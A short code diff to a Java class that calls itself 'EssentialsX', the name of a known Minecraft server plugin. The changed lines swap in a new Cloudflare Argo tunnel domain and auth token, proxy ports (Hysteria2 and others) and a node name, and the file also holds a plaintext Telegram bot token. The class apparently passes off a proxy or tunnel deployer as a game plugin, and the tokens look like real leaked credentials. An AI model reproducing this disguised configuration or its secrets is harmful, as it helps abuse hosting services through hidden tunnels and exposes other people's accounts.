@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "byte.3211.qzz.io");
-        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiY2FlZmM4NTgtODdjMS00ZDljLWIyNTQtMGU2MjZjMjYyYzhhIiwicyI6Ik16WXhNekU1WXpndE56Wm1OeTAwTUdWbUxXRmlNMkl0WVdObVlqazBZVEV3TlRneCJ9");
+        env.put("ARGO_DOMAIN", "3arb.1976.dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiOTU2N2E5ZTctN2IzZC00YzU2LWJhYjMtMzlhMzk2M2UzZGIxIiwicyI6Ik9XRmtZV1k0WVdNdE1UUTNOQzAwTm1NeUxXRTFPVE10TjJJNFpEY3lZamRrTnpsaCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "20244");
+        env.put("HY2_PORT", "25574");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7615526848:AAGVWjn03O5rdWiacPhtcl6TexJ7DQFTFb8");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "byteproject");
+        env.put("NAME", "3arb");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
